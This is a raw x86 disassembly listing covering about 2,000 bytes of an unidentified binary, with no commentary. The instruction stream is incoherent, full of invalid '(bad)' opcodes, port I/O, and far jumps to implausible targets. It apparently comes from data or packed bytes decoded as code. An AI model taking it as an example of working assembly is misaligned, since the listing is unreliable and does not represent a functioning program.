  4493d1:	sbb    dh,BYTE PTR [ebx+0x35]
  4493d4:	in     eax,dx
  4493d5:	dec    edx
  4493d6:	push   ebx
  4493d7:	push   ecx
  4493d8:	in     eax,dx
  4493d9:	jge    0x44942e
  4493db:	int3   
  4493dc:	in     al,dx
  4493dd:	test   eax,0xd9ecfb53
  4493e2:	push   ebx
  4493e3:	shr    esp,1
  4493e5:	out    0x33,eax
  4493e7:	jmp    0x4493d5
  4493e9:	in     eax,dx
  4493ea:	xor    eax,DWORD PTR [ebp-0xe]
  4493ed:	std    
  4493ee:	xor    esi,DWORD PTR [edi]
  4493f0:	lock sbb dh,BYTE PTR [eax]
  4493f3:	imul   esi,eax,0x67
  4493f6:	nop
  4493f7:	push   esp
  4493f8:	rep lods al,BYTE PTR ds:[esi]
  4493fa:	add    BYTE PTR [eax-0x6f010cd6],dl
  449400:	clc    
  449401:	out    dx,eax
  449402:	xchg   cx,ax
  449404:	mov    esi,0x647196ef
  449409:	lock fidiv WORD PTR [ecx+0x35]
  44940d:	out    dx,al
  44940e:	sbb    al,0x76
  449410:	out    dx,eax
  449411:	clc    
  449412:	inc    ebx
  449413:	outs   dx,BYTE PTR ds:[esi]
  449414:	xchg   edi,eax
  449415:	clc    
  449416:	jns    0x44946e
  449418:	push   edi
  449419:	stc    
  44941a:	mov    al,0x4e
  44941c:	stos   BYTE PTR es:[edi],al
  44941d:	clc    
  44941e:	add    dl,BYTE PTR [edi+0x10]
  449421:	out    dx,eax
  449422:	inc    edx
  449423:	dec    edi
  449424:	or     dh,ch
  449426:	push   esp
  449427:	aaa    
  449428:	mov    ds:0x492fe1ed,eax
  44942d:	in     al,dx
  44942e:	or     eax,0x6aeef934
  449433:	sub    al,0xf5
  449435:	out    dx,al
  449436:	(bad)  
  449437:	xchg   esp,eax
  449438:	fnstenv [ebx]
  44943a:	idiv   BYTE PTR [eax]
  44943c:	or     ebp,DWORD PTR [esp+ebp*8+0x56]
  449440:	add    DWORD PTR [ecx],ecx
  449442:	jmp    0x4493d1
  449444:	add    BYTE PTR [ecx-0x42ff3916],ah
  44944a:	jmp    0x35:0xeb76fffe
  449451:	xlat   BYTE PTR ds:[ebx]
  449452:	jmp    0xea4593d9
  449457:	dec    ebp
  449458:	jmp    DWORD PTR [ecx+ebp*8-0x16670051]
  44945f:	add    BYTE PTR [eax-0x3515b701],cl
  449465:	(bad)  
  449466:	sub    ch,dl
  449468:	sbb    edi,edi
  44946a:	shr    eax,cl
  44946c:	ds (bad) 
  44946e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44946f:	call   0xe9aa92f0
  449474:	mov    dh,0xfd
  449476:	sub    cl,ch
  449478:	sar    ebp,1
  44947a:	call   0xf3426c6e
  44947f:	out    dx,eax
  449480:	pop    ebp
  449481:	add    eax,0x56beff5
  449486:	out    0xef,eax
  449488:	pop    ecx
  449489:	add    eax,0x57ff011
  44948e:	sti    
  44948f:	out    dx,eax
  449490:	jne    0x449497
  449492:	in     eax,dx
  449493:	out    dx,eax
  449494:	and    eax,DWORD PTR ds:0x521f01f
  44949a:	cmp    eax,esi
  44949c:	daa    
  44949d:	add    eax,0x52df043
  4494a2:	add    eax,0xf704fbf0
  4494a7:	out    dx,eax
  4494a8:	or     DWORD PTR ds:0x4eff001,eax
  4494ae:	imul   ebp,edi,0xffffffe5
  4494b1:	add    al,0x1
  4494b3:	fs jne 0x44951d
  4494b6:	xor    eax,0x356d4d56
  4494bb:	mov    BYTE PTR [ebp+0x5f],al
  4494be:	xor    eax,0x35713d92
  4494c3:	pushf  
  4494c4:	add    BYTE PTR ds:0x4d8e3583,dh
  4494ca:	test   DWORD PTR ds:0x35174530,esi
  4494d0:	sbb    bh,BYTE PTR ds:0x35143529
  4494d6:	cmp    esi,DWORD PTR ds:0x353d0d46
  4494dc:	sbb    BYTE PTR ds:0xfd22352f,al
  4494e2:	inc    eax
  4494e3:	xor    eax,0x33d2f4ec
  4494e8:	fimul  WORD PTR [edx*8-0x18fb1fcd]
  4494ef:	xor    ecx,edx
  4494f1:	cld    
  4494f2:	clc    
  4494f3:	xor    eax,esp
  4494f5:	hlt    
  4494f6:	or     dh,BYTE PTR [esi+esi*4]
  4494f9:	int3   
  4494fa:	or     al,0x34
  4494fc:	sub    bl,cl
  4494fe:	(bad)  
  4494ff:	xor    esi,DWORD PTR [edx]
  449501:	mov    ebx,0xbb3c3390
  449506:	mov    ds:0xa4cb2e33,al
  44950b:	xor    edx,DWORD PTR [eax-0x35]
  44950e:	adc    dh,BYTE PTR [esi+ebx*4]
  449511:	mov    ebx,0xb99135ed
  449516:	xor    esi,DWORD PTR [esi]
  449518:	jmp    0x49456eae
  44951d:	pop    esi
  44951e:	fld    DWORD PTR [eax]
  449520:	in     al,dx
  449521:	xchg   ecx,eax
  449522:	cmc    
  449523:	xor    BYTE PTR ds:0x612fcb8f,al
  449529:	add    BYTE PTR [edi+0x57],dh
  44952c:	xor    BYTE PTR [eax],al
  44952e:	mov    bl,0x46
  449530:	out    0x32,al
  449532:	add    BYTE PTR [eax-0x59],cl
  449535:	xor    eax,esi
  449537:	dec    eax
  449538:	(bad)  [ebx]
  44953a:	ror    BYTE PTR [eax-0x1a],1
  44953d:	xor    al,0xff
  44953f:	dec    ecx
  449540:	shl    BYTE PTR ds:0x37134bc0,0x57
  449547:	dec    esp
  449548:	ss aaa 
  44954a:	sbb    ecx,DWORD PTR [ebx-0x7f]
  44954d:	aaa    
  44954e:	ret    
  44954f:	dec    esp
  449550:	aad    0x37
  449552:	push   0x4c
  449554:	in     al,0x37
  449556:	cmp    DWORD PTR [edi+edi*8],esi
  449559:	aaa    
  44955a:	adc    eax,0xf0384134
  44955f:	xor    edi,DWORD PTR [ebp+0x38]
  449562:	fwait
  449563:	sub    eax,0x2da43897
  449568:	lods   al,BYTE PTR ds:[esi]
  449569:	cmp    BYTE PTR [ebx],cl
  44956b:	sub    eax,0x2ccd3915
  449570:	outs   dx,DWORD PTR ds:[esi]
  449571:	cmp    DWORD PTR [esi+0x3539a02e],eax
  449577:	cs in  eax,dx
  449579:	cmp    esi,esi
  44957b:	sub    eax,0x2f383a5d
  449580:	jge    0x4495bc
  449582:	fild   QWORD PTR ds:0x2da33ad1
  449588:	stc    
  449589:	cmp    bl,BYTE PTR [edi+ebp*1]
  44958c:	test   DWORD PTR [ebx],edi
  44958e:	add    cl,ch
  449590:	cs stos DWORD PTR es:[edi],eax
  449592:	cmp    ebp,DWORD PTR ds:0xec3bba2f
  449598:	cs pop ss
  44959a:	cmp    al,0x9a
  44959c:	aaa    
  44959d:	inc    edi
  44959e:	cmp    al,0xc
  4495a0:	cmp    BYTE PTR [edi-0x26c7d5c4],dl
  4495a6:	cmp    al,0x62
  4495a8:	push   edi
  4495a9:	fisubr WORD PTR [ebx]
  4495ab:	cmp    al,0xf3
  4495ad:	jmp    0x2c68:0xeaf5344a
  4495b4:	inc    edx
  4495b5:	call   0xebaebb37
  4495ba:	call   FWORD PTR [ebp+0x31]
  4495bd:	ret    0x6200
  4495c0:	jl     0x4495c4
  4495c2:	add    BYTE PTR [edx+0x4b],ah
  4495c5:	repnz out dx,al
  4495c7:	xchg   edx,eax
  4495c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4495c9:	icebp  
  4495ca:	sub    esi,DWORD PTR [ebx-0x17]
  4495cd:	jmp    0x449587
  4495cf:	jo     0x4495d4
  4495d1:	in     al,dx
  4495d2:	and    eax,0x2def4371
  4495d7:	outs   dx,BYTE PTR ds:[esi]
  4495d8:	dec    ebx
  4495d9:	out    0x41,al
  4495db:	push   esi
  4495dc:	adc    esi,esp
  4495de:	ror    DWORD PTR [eax+esi*2-0xd],cl
  4495e2:	push   ebp
  4495e3:	push   ebp
  4495e4:	lods   al,BYTE PTR ds:[esi]
  4495e5:	repnz mov ebp,0xb7f2d14d
  4495eb:	cmp    ch,BYTE PTR [ebp+eiz*8+0x69]
  4495ef:	cmp    esi,DWORD PTR [esi+0x2b009ce4]
  4495f5:	mov    eax,0x8a2903e3
  4495fa:	out    0xf2,eax
  4495fc:	cdq    
  4495fd:	sub    esi,ebx
  4495ff:	and    BYTE PTR [edi-0x708a2210],dl
  449605:	aam    0xea
  449607:	xor    al,0x84
  449609:	in     eax,dx
  44960a:	jmp    0x7569:0xe7fb7cdd
  449611:	xor    dl,dl
  449613:	add    BYTE PTR [edx+0x54],ah
  449616:	std    
  449617:	jmp    DWORD PTR [edx+0x3c]
  44961a:	repz pop ebx
  44961c:	push   ebx
  44961d:	push   ebp
  44961e:	repnz in eax,dx
  449620:	push   ebx
  449621:	fldcw  WORD PTR [eax]
  449623:	not    BYTE PTR [ebx+ecx*1]
  449626:	jb     0x44961e
  449628:	or     al,0xa
  44962a:	inc    ebp
  44962b:	cmc    
  44962c:	sub    al,BYTE PTR ds:0x57df0a2
  449632:	retf   
  449633:	out    dx,al
  449634:	jmp    0xda33fb3c
  449639:	add    al,0x51
  44963b:	out    dx,eax
  44963c:	add    BYTE PTR [esp+esi*1],al
  44963f:	out    dx,eax
  449640:	adc    BYTE PTR [edi+edx*4],al
  449643:	out    dx,eax
  449644:	adc    DWORD PTR [ebx+ebp*1],eax
  449647:	out    dx,eax
  449648:	outs   dx,BYTE PTR ds:[esi]
  449649:	pop    es
  44964a:	(bad)  
  44964b:	icebp  
  44964c:	sbb    DWORD PTR [edi],eax
  44964e:	leave  
  44964f:	lock loope 0x449657
  449652:	xchg   cl,dh
  449654:	in     eax,dx
  449655:	add    eax,0x3900f122
  44965a:	push   es
  44965b:	out    0xeb,al
  44965d:	rol    BYTE PTR [eax],0x82
  449660:	in     al,dx
  449661:	or     eax,DWORD PTR [ecx]
  449663:	and    ah,ch
  449665:	pop    ss
  449666:	add    ecx,edi
  449668:	jmp    0x98:0xead40068
  44966f:	push   cs
  449670:	out    dx,al
  449671:	pusha  
  449672:	add    ah,BYTE PTR [edx+0x5e028cec]
  449678:	in     eax,dx
  449679:	ret    
  44967a:	add    ebp,ebp
  44967c:	in     al,dx
  44967d:	xchg   ebp,eax
  44967e:	std    
  44967f:	xchg   esp,eax
  449680:	out    0x2d,eax
  449682:	std    
  449683:	push   edx
  449684:	call   0xe7a193c8
  449689:	aad    0xfc
  44968b:	outs   dx,BYTE PTR ds:[esi]
  44968c:	out    0xb,eax
  44968e:	std    
  44968f:	nop
  449690:	out    0xf9,eax
  449692:	cld    
  449693:	call   0xa5e7:0xadfc97e7
  44969a:	cld    
  44969b:	add    ch,dl
  44969d:	test   dl,bh
  44969f:	xor    esi,DWORD PTR [edx+0x7835df8b]
  4496a5:	jp     0x44970b
  4496a7:	ss dec edx
  4496a9:	jp     0x449633
  4496ab:	ss push esp
  4496ad:	mov    bh,BYTE PTR [ebx+0x36]
  4496b0:	mov    ecx,0x79361f8a
  4496b5:	jp     0x4496fb
  4496b7:	ss jmp 0x71456f7e
  4496bd:	add    BYTE PTR [ecx-0x27],ah
  4496c0:	add    dh,ah
  4496c2:	push   ecx
  4496c3:	into   
  4496c4:	xor    BYTE PTR [esi+edx*2],cl
  4496c7:	in     eax,dx
  4496c8:	xor    BYTE PTR [eax],ah
  4496ca:	dec    esi
  4496cb:	cld    
  4496cc:	xor    BYTE PTR [eax-0x3fcf5fcf],bh
  4496d2:	xor    DWORD PTR [ebp-0x41ce3ed0],ebp
  4496d8:	xor    BYTE PTR [eax+0x31],bl
  4496db:	arpl   WORD PTR [ecx],si
  4496dd:	mov    BYTE PTR [ecx],dl
  4496df:	pop    edi
  4496e0:	xor    DWORD PTR [edi+0x11],edi
  4496e3:	test   DWORD PTR [ecx],esi
  4496e5:	sub    dl,BYTE PTR [ecx]
  4496e7:	sub    esi,DWORD PTR [ecx]
  4496e9:	adc    DWORD PTR ds:[esi],ebx
  4496ec:	xor    DWORD PTR [edx],eax
  4496ee:	icebp  
  4496ef:	dec    ecx
  4496f0:	xor    ecx,ebp
  4496f2:	lock shr DWORD PTR [edi],1
  4496f5:	f2xm1  
  4496f7:	into   
  4496f8:	das    
  4496f9:	shl    eax,1
  4496fb:	repz das 
  4496fd:	mov    esi,0xa53005d0
  449702:	rcl    BYTE PTR [ebp-0x5d28c2d1],1
  449708:	das    
  449709:	dec    ebp
  44970a:	iret   
  44970b:	(bad)  
  44970c:	das    
  44970d:	push   edx
  44970e:	mov    bh,0x59
  449710:	xor    BYTE PTR [ebp-0x51],bl
  449713:	dec    ebp
  449714:	xor    BYTE PTR [eax],al
  449716:	inc    edi
  449717:	inc    esi
  449718:	mov    al,ds:0xbb462f31
  44971d:	xor    eax,ecx
  44971f:	inc    esi
  449720:	mov    ebp,0x46f80031
  449725:	shl    BYTE PTR [ecx],cl
  449727:	fadd   DWORD PTR [esi-0x10]
  44972a:	xor    ecx,eax
  44972c:	inc    esi
  44972d:	add    DWORD PTR [edx],esi
  44972f:	mov    WORD PTR [edx+0x23],cs
  449732:	xor    cl,BYTE PTR [esi+0x67324e4a]
  449738:	inc    edi
  449739:	ja     0x44976d
  44973b:	or     al,0x47
  44973d:	xchg   edi,eax
  44973e:	xor    ah,BYTE PTR [ebp+0x232ac47]
  449744:	inc    edi
  449745:	int    0x32
  449747:	fs dec eax
  449749:	and    dh,BYTE PTR [ebx]
  44974b:	push   0x48
  44974d:	dec    ebx
  44974e:	xor    esi,DWORD PTR [eax+ecx*2+0x2c1633d7]
  449755:	sbb    DWORD PTR [edi+edx*2],esi
  449758:	dec    ecx
  449759:	sub    dh,BYTE PTR [edi*8+0x3934642b]
  449760:	dec    ecx
  449761:	and    esi,DWORD PTR ds:0x3541490c
  449767:	int    0x48
  449769:	sub    DWORD PTR [esi],esi
  44976b:	shr    BYTE PTR [edi],0x7f
  44976e:	cmp    BYTE PTR [edi+0x2d],dh
  449771:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449772:	cmp    BYTE PTR [edi],ch
  449774:	sub    eax,0x2d5438cf
  449779:	add    edi,DWORD PTR [ecx]
  44977b:	sbb    al,0x2d
  44977d:	sar    DWORD PTR [ecx],1
  44977f:	pop    esi
  449780:	xor    ch,BYTE PTR [edi+0x3b2f193a]
  449786:	cmp    eax,DWORD PTR [eax]
  449788:	jns    0x4497ba
  44978a:	aaa    
  44978b:	cmp    ecx,DWORD PTR [edx+0x623b5830]
  449791:	xchg   ecx,eax
  449792:	jmp    0xe9dd10f3
  449797:	jo     0x449802
  449799:	mov    al,0xea
  44979b:	xchg   ebp,eax
  44979c:	imul   ebp,DWORD PTR [eax-0x15],0xeb7a59c1
  4497a3:	fcomp  DWORD PTR [ecx+0x1a]
  4497a6:	jmp    0x449795
  4497a8:	dec    ecx
  4497a9:	sub    bl,dh
  4497ab:	inc    eax
  4497ac:	inc    esi
  4497ad:	addr16 fdivrp st(1),st
  4497b0:	ds sub eax,0x32341bdc
  4497b6:	mov    dl,0x0
  4497b8:	(bad)  {k7}{z}
  4497bd:	add    dl,dh
  4497bf:	dec    edx
  4497c0:	xchg   ebx,eax
  4497c1:	jmp    0x4497b5
  4497c3:	xlat   BYTE PTR ds:[ebx]
  4497c4:	xchg   ecx,eax
  4497c5:	xor    al,0xe6
  4497c7:	add    al,0x96
  4497c9:	push   ebp
  4497ca:	icebp  
  4497cb:	mov    WORD PTR ss:[ebx],ds
  4497ce:	in     al,0x8f
  4497d0:	je     0x44980f
  4497d2:	out    0x37,eax
  4497d4:	ins    DWORD PTR es:[edi],dx
  4497d5:	xchg   edi,esp
  4497d7:	jne    0x44984e
  4497d9:	dec    ebx
  4497da:	out    0xed,eax
  4497dc:	ins    DWORD PTR es:[edi],dx
  4497dd:	jmp    edi
  4497df:	ficomp WORD PTR [ecx+0x21]
  4497e2:	fadd   QWORD PTR [edx-0x3523aaac]
  4497e8:	dec    esp
  4497e9:	fstp   st(3)
  4497eb:	add    eax,0xdeb14500
  4497f0:	pushf  
  4497f1:	cmp    eax,0xf5ffdf05
  4497f6:	xor    BYTE PTR [edx+0x18c6201],al
  4497fc:	add    BYTE PTR [edx-0x23],ah
  4497ff:	in     al,dx
  449800:	icebp  
  449801:	xchg   ebx,eax
  449802:	sub    al,0xf0
  449804:	or     DWORD PTR [eax-0x6f9b0f9b],edx
  44980a:	fldenv [edx+esi*8-0x12]
  44980e:	pop    es
  44980f:	(bad)  
  449810:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449812:	pop    es
  449813:	leave  
  449814:	repnz mov BYTE PTR [edi],0xe1
  449818:	lock push esi
  44981a:	push   es
  44981b:	stc    
  44981c:	lock pushw es
  44981f:	and    cl,dh
  449821:	or     BYTE PTR [esi],al
  449823:	ss icebp 
  449825:	pop    ss
  449826:	push   es
  449827:	outs   dx,DWORD PTR ds:[esi]
  449828:	icebp  
  449829:	jns    0x449831
  44982b:	in     eax,dx
  44982c:	out    dx,eax
  44982d:	ss add eax,0x4f9f025
  449833:	ss out dx,eax
  449835:	jle    0x44983b
  449837:	inc    esi
  449838:	out    dx,al
  449839:	jl     0x44983e
  44983b:	fsubp  st(4),st
  44983d:	xor    eax,DWORD PTR [edx]
  44983f:	or     ebp,ebp
  449841:	fadd   QWORD PTR [edx]
  449843:	enter  0x81eb,0x1
  449847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449848:	jmp    0x4497d3
  44984a:	add    ebp,ebx
  44984c:	jmp    0x44982e
  44984e:	add    BYTE PTR [esp+ebp*8+0x0],ch
  449852:	lock add BYTE PTR [edi],ah
  449855:	in     al,dx
  449856:	daa    
  449857:	add    DWORD PTR [esp+ebp*8],edi
  44985a:	arpl   WORD PTR [eax],ax
  44985c:	fsubr  st,st(2)
  44985e:	jb     0x449860
  449860:	retf   
  449861:	jmp    0xffde:0xeb660094
  449868:	dec    ebx
  449869:	jmp    0x449854
  44986b:	call   FWORD PTR [edx-0x15]
  44986e:	retf   
  44986f:	jmp    DWORD PTR ds:0xd5001eeb
  449875:	jmp    0xe9089758
  44987a:	ins    BYTE PTR es:[edi],dx
  44987b:	(bad)  
  44987c:	adc    eax,0xb7fdf0e9
  449881:	out    0x95,eax
  449883:	std    
  449884:	add    BYTE PTR [esi-0x7ccc6f44],bh
  44988a:	les    edx,FWORD PTR [eax+0x34]
  44988d:	test   DWORD PTR [esi+ebp*1+0x3ec4d834],edi
  449894:	xor    al,0x3
  449896:	mov    esp,0xc6883651
  44989b:	outs   dx,DWORD PTR ds:[esi]
  44989c:	ss jmp 0x89457073
  4498a2:	popa   
  4498a3:	fld    DWORD PTR [eax]
  4498a5:	push   ebp
  4498a6:	xchg   ecx,eax
  4498a7:	jb     0x4498da
  4498a9:	call   0x4590:0xc8312e91
  4498b0:	xor    bl,ch
  4498b2:	jae    0x4498bc
  4498b4:	xor    edx,ebx
  4498b6:	add    BYTE PTR [ebx-0x56],dh
  4498b9:	xor    dl,BYTE PTR [ebx+0x73]
  4498bc:	call   0xdbb77bf2
  4498c1:	xor    ecx,eax
  4498c3:	push   edx
  4498c4:	and    esi,DWORD PTR [edx]
  4498c6:	cdq    
  4498c7:	push   edx
  4498c8:	adc    dh,BYTE PTR [edx]
  4498ca:	mov    ss,WORD PTR [edx+0x2a]
  4498cd:	xor    ah,BYTE PTR [ecx+0x52]
  4498d0:	cmp    DWORD PTR [edx],esi
  4498d2:	out    0x4d,eax
  4498d4:	shr    DWORD PTR [ebx+ecx*1],1
  4498d7:	xor    al,BYTE PTR [ecx]
  4498d9:	sub    eax,0x2c9a3213
  4498de:	mov    al,0x35
  4498e0:	mov    al,ds:0x5b0dc82c
  4498e5:	sub    eax,0x2d840588
  4498ea:	sbb    ebp,edi
  4498ec:	cmp    ch,BYTE PTR ds:0x2d46f512
  4498f2:	mov    esi,0x352c790c
  4498f7:	add    al,0x30
  4498f9:	sub    al,0xcc
  4498fb:	inc    DWORD PTR [ebp+0x440a002e]
  449901:	push   ds
  449902:	cmp    DWORD PTR [edx],eax
  449904:	inc    esp
  449905:	cdq    
  449906:	cmp    DWORD PTR [ebp+0x7d3a8c42],esp
  44990c:	inc    edx
  44990d:	mov    edx,0x6179b3a
  449912:	cmp    ecx,DWORD PTR [esi-0xc47ce8]
  449918:	sbb    BYTE PTR [ebx],bh
  44991a:	cmp    al,0x0
  44991c:	lods   al,BYTE PTR ds:[esi]
  44991d:	cmp    DWORD PTR [edi],ebp
  44991f:	cmp    eax,0x3dad3ada
  449924:	sar    DWORD PTR [edx],0xd5
  449927:	cmp    eax,0x3e443a81
  44992c:	jecxz  0x449969
  44992e:	mov    ch,0x3e
  449930:	leave  
  449931:	cmp    edx,edx
  449933:	ds out 0x3b,al
  449936:	loop   0x449976
  449938:	test   eax,0x4b3f3c3b
  44993d:	cmp    al,0x8d
  44993f:	aas    
  449940:	jnp    0x4498fe
  449942:	(bad)  
  449943:	push   DWORD PTR [edi+0x110000dd]
  449949:	or     al,0x48
  44994b:	xor    BYTE PTR [edx-0x1cf5bf3],bl
  449951:	or     al,0xca
  449953:	xor    BYTE PTR [ebx+0x6130fb0d],bl
  449959:	push   cs
  44995a:	dec    esi
  44995b:	xor    DWORD PTR [ecx+0x6d31b80e],ebp
  449961:	push   cs
  449962:	cli    
  449963:	xor    DWORD PTR [ebx],eax
  449965:	push   cs
  449966:	push   ds
  449967:	xor    dh,dh
  449969:	or     eax,0xdd4326b
  44996e:	ins    BYTE PTR es:[edi],dx
  44996f:	xor    cl,BYTE PTR [ecx-0x7dcd70f1]
  449975:	bswap  ebx
  449977:	xor    esp,DWORD PTR [edx+0x3e]
  44997a:	into   
  44997b:	sbb    dh,BYTE PTR [esi]
  44997d:	sbb    ecx,esi
  44997f:	add    BYTE PTR ss:[esi],ch
  449982:	push   ebp
  449983:	into   
  449984:	push   0xffffff96
  449986:	repz fcomp st(5)
  449989:	mov    cs,WORD PTR [edi]
  44998b:	fldcw  WORD PTR [edx]
  44998d:	xchg   edi,eax
  44998e:	sbb    cl,0x57
  449991:	(bad)  
  449992:	mov    ah,0xd8
  449994:	cmc    
  449995:	ja     0x44996e
  449997:	ficom  DWORD PTR [esi+0x6c]
  44999a:	mov    dl,0xd7
  44999c:	(bad)  
  44999d:	je     0x449987
  44999f:	fld    st(7)
  4499a1:	ins    DWORD PTR es:[edi],dx
  4499a2:	test   edx,ebx
  4499a4:	loop   0x449a00
  4499a6:	ss aam 0x97
  4499a9:	pop    eax
  4499aa:	jo     0x449980
  4499ac:	xor    BYTE PTR [ecx-0x45],cl
  4499af:	(bad)  
  4499b0:	(bad)  
  4499b1:	dec    ecx
  4499b2:	(bad)  
  4499b4:	data16 aas 
  4499b6:	(bad)  
  4499b8:	mov    dl,0x34
  4499ba:	mov    edi,ds
  4499bc:	mov    ebx,0xf1e0692c
  4499c1:	and    al,0x59
  4499c3:	loopne 0x4499c8
  4499c5:	popf   
  4499c6:	cmp    ebx,esp
  4499c8:	sub    DWORD PTR [ebp-0x72c61c8b],edx
  4499ce:	(bad)  
  4499cf:	loope  0x449a29
  4499d1:	test   DWORD PTR [edx-0x1d],esp
  4499d4:	(bad)  
  4499d5:	cmp    eax,0x62015241
  4499da:	push   0xda620002
  4499df:	int3   
  4499e0:	das    
  4499e1:	jb     0x4499e8
  4499e3:	ror    dl,cl
  4499e5:	add    BYTE PTR [edx-0x57],dl
  4499e8:	retf   
  4499e9:	jne    0x449a3c
  4499eb:	pusha  
  4499ec:	iret   
  4499ed:	mov    al,0x51
  4499ef:	sahf   
  4499f0:	into   
  4499f1:	sub    cl,BYTE PTR [esi-0x27]
  4499f4:	aam    0xd7
  4499f6:	cmp    ch,ch
  4499f8:	test   al,0xd7
  4499fa:	sbb    dh,ch
  4499fc:	pop    ds
  4499fd:	fsub   DWORD PTR [edi]
  4499ff:	in     eax,dx
  449a00:	or     bl,al
  449a02:	(bad)  
  449a03:	in     al,dx
  449a04:	hlt    
  449a05:	xlat   BYTE PTR ds:[ebx]
  449a06:	aam    0xec
  449a08:	lock fstp DWORD PTR [edx+0x32d9a8ef]
  449a0f:	out    dx,eax
  449a10:	mov    ds,ecx
  449a12:	sub    al,0xef
  449a14:	inc    esi
  449a15:	fidivr DWORD PTR [edx]
  449a17:	out    dx,eax
  449a18:	push   esi
  449a19:	ficom  DWORD PTR [ecx]
  449a1b:	repz mov ebp,ds
  449a1e:	mov    al,ds:0x47e087f2
  449a23:	hlt    
  449a24:	or     ebx,edi
  449a26:	push   edi
  449a27:	hlt    
  449a28:	lahf   
  449a29:	loop   0x4499bb
  449a2b:	imul   DWORD PTR [esi-0x18096b1e]
  449a31:	inc    ebx
  449a32:	arpl   cx,bx
  449a34:	sub    eax,DWORD PTR [edx+eiz*2]
  449a37:	fld    st(6)
  449a39:	rcr    ebp,cl
  449a3b:	jmp    0xe9226eb5
  449a40:	cmp    eax,0xddeb0dd3
  449a45:	aam    0x86
  449a47:	jmp    0x7aec:0xd100d8b2
  449a4e:	fchs   
  449a50:	lock ja 0x449a2e
  449a53:	jae    0x449a48
  449a55:	sbb    ch,bl
  449a57:	jle    0x449a4b
  449a59:	mov    ds:0xc3f293dc,eax
  449a5e:	fdivr  QWORD PTR [eax-0x4823490e]
  449a64:	repnz sub ebx,ebp
  449a67:	xor    esi,edx
  449a69:	cwde   
  449a6a:	fild   QWORD PTR [edx-0xc]
  449a6d:	add    dl,bl
  449a6f:	sub    al,0xce
  449a71:	xor    ecx,edx
  449a73:	and    al,0x81
  449a75:	xor    al,0x5a
  449a77:	sbb    eax,0x151b346e
  449a7c:	ss imul cl
  449a7f:	xor    eax,ebx
  449a81:	add    BYTE PTR [ecx+0x5e],cl
  449a84:	fld    DWORD PTR [eax]
  449a86:	xor    BYTE PTR [eax-0x53cacca3],0x13
  449a8d:	xor    eax,eax
  449a8f:	mov    ch,0xfe
  449a91:	sub    al,0xa3
  449a93:	lods   eax,DWORD PTR ds:[esi]
  449a94:	xchg   DWORD PTR [ebx+eax*2],ebp
  449a97:	call   0x2cb6:0x9a5f2cc6
  449a9e:	jl     0x449a35
  449aa0:	dec    ecx
  449aa1:	sub    eax,0x2d698d85
  449aa6:	call   0x44ad:0xce2d13b5
  449aad:	sub    eax,0xd9b500b4
  449ab2:	sub    ebx,ebx
  449ab4:	lods   al,BYTE PTR ds:[esi]
  449ab5:	int    0x2b
  449ab7:	push   es
  449ab8:	xchg   ebp,eax
  449ab9:	lahf   
  449aba:	sub    eax,DWORD PTR [ecx-0x73]
  449abd:	mov    ebp,DWORD PTR [ebx]
  449abf:	add    DWORD PTR [ebp-0x7399d459],edx
  449ac5:	pop    esp
  449ac6:	sub    al,0x5d
  449ac8:	xor    al,0x4e
  449aca:	sub    al,0x45
  449acc:	sub    al,0x7e
  449ace:	sub    al,0x36
  449ad0:	xor    al,0x77
  449ad2:	sub    al,0xa3
  449ad4:	sub    al,0xa
  449ad6:	sub    al,0x3f
  449ad8:	adc    al,0x14
  449ada:	sub    al,0xd8
  449adc:	sbb    esi,DWORD PTR [edx+0x600b6a2e]
  449ae2:	das    
  449ae3:	and    eax,0x2f190b
  449ae8:	jge    0x449afc
  449aea:	int3   
  449aeb:	xor    DWORD PTR ss:[edx],edx
  449aee:	inc    edi
  449aef:	cmp    BYTE PTR [edi],bl
  449af1:	adc    ecx,edx
  449af3:	cmp    BYTE PTR [edi],ch
  449af5:	adc    BYTE PTR [esi+0x2016a739],al
  449afb:	cmp    ecx,DWORD PTR [esi]
  449afd:	push   ss
  449afe:	arpl   WORD PTR [ebx],di
  449b00:	int    0x15
  449b02:	lds    edi,FWORD PTR [ebx]
  449b04:	push   ecx
  449b05:	adc    eax,0x151e3c16
  449b0a:	and    DWORD PTR ds:0x3d8e1412,edi
  449b10:	sti    
  449b11:	cmp    ch,BYTE PTR [eax+0x3e]
  449b14:	add    BYTE PTR [edx+edi*1],ch
  449b17:	test   al,0x3e
  449b19:	mov    ds:0x4f3f2b13,al
  449b1e:	adc    al,0xf6
  449b20:	(bad)  
  449b21:	mov    ebx,0x3ffffff8
  449b26:	fld    QWORD PTR [eax]
  449b28:	add    BYTE PTR [ebx+0x51301d08],dl
  449b2e:	or     eax,0xdcc3080
  449b33:	mov    BYTE PTR [ecx],dh
  449b35:	loopne 0x449b45
  449b37:	into   
  449b38:	xor    DWORD PTR ds:0xfe325b07,esi
  449b3e:	push   es
  449b3f:	(bad)  
  449b40:	xor    bl,BYTE PTR ds:0x44331c07
  449b46:	or     BYTE PTR [edx+0x33],dh
  449b49:	repnz pop es
  449b4b:	xchg   ebp,eax
  449b4c:	xor    al,0xeb
  449b4e:	adc    BYTE PTR [edx],cl
  449b50:	xor    eax,0x356a1115
  449b55:	lods   al,BYTE PTR ds:[esi]
  449b56:	adc    dh,bh
  449b58:	xor    eax,0x381d0e44
  449b5d:	leave  
  449b5e:	xadd   BYTE PTR [edx],bh
  449b61:	bound  ecx,QWORD PTR [ecx+0x28690bda]
  449b67:	fld    TBYTE PTR [ecx+ebx*2]
  449b6a:	push   ebx
  449b6b:	fist   DWORD PTR [ecx-0x442651a7]
  449b71:	dec    ecx
  449b72:	retf   0x2fd9
  449b75:	inc    esi
  449b76:	dec    ebx
  449b77:	(bad)  
  449b78:	test   BYTE PTR [eax],al
  449b7a:	ds sbb cl,ah
  449b7d:	pop    esi
  449b7e:	aaa    
  449b7f:	dec    ebp
  449b80:	loope  0x449b4b
  449b82:	das    
  449b83:	into   
  449b84:	fisttp WORD PTR [eax]
  449b86:	and    al,0x20
  449b88:	aam    0x44
  449b8a:	pushf  
  449b8b:	ja     0x449b61
  449b8d:	imul   edx,DWORD PTR [ecx+eax*8-0x5a736e2a],0xffffffd6
  449b95:	rol    BYTE PTR [ebx+edi*2-0x7082b029],0xd5
  449b9d:	nop
  449b9e:	jne    0x449c19
  449ba0:	xlat   BYTE PTR ds:[ebx]
  449ba1:	(bad)  
